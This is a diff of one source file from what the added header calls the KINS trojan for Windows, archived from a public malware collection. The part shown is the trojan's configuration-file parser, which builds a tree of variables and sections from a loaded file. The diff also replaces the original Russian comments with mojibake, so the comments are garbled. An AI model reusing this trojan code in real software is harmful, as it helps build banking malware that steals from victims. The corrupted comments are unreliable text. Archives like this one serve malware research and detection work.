@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "str.h"
@@ -20,7 +31,7 @@ bool Config0::_ParseFile(LPWSTR pszFileName, CFGDATA *pCD)
   bool r = false;
   Mem::_zero(pCD, sizeof(CFGDATA));
   
-  //Открываем файл.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   Fs::MEMFILE fl;
   if(Fs::_fileToMem(pszFileName, &fl, 0))
   {
@@ -35,16 +46,16 @@ bool Config0::_ParseFile(LPWSTR pszFileName, CFGDATA *pCD)
       
       while(!error && pCur < pEnd)
       {
-        //Ищим конец строки.
+        //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         LPSTR pp = pCur;
         while(*pp != '\n' && *pp != '\r' && pp < pEnd)pp++;
 
-        //Получаем аргумены.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         LPSTR *pArgs = NULL;
         DWORD dwArgsCount = Str::_getArgumentsA(pCur, (DWORD)(pp - pCur), &pArgs, 0);
         if(dwArgsCount > 0 && dwArgsCount != (DWORD)-1 && pArgs[0][0] != 0 && pArgs[0][0] != ';')
         {
-          //Конец перечисления потомков.
+          //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           if(CWA(kernel32, lstrcmpiA)(CONFIG0_NAME_SECTION_END, pArgs[0]) == 0)
           {
             if(dwTree == 0)error = true;
@@ -53,14 +64,14 @@ bool Config0::_ParseFile(LPWSTR pszFileName, CFGDATA *pCD)
           }
           else
           {
-            //Создание переменной.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             VAR *pNewVar = _AddVar(dwTree ? pTree[dwTree - 1] : NULL, pCD, pArgs, (BYTE)dwArgsCount);
             if(pNewVar == NULL)
             {
               Mem::freeArrayOfPointers(pArgs, dwArgsCount);
               error = true;
             }
-            //Начало перечисления потомков.
+            //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             else if(CWA(kernel32, lstrcmpiA)(CONFIG0_NAME_SECTION_BEGIN, pArgs[0]) == 0)
             {
               if(!Mem::reallocEx(&pTree, sizeof(VAR *) * (dwTree + 1)))error = true;
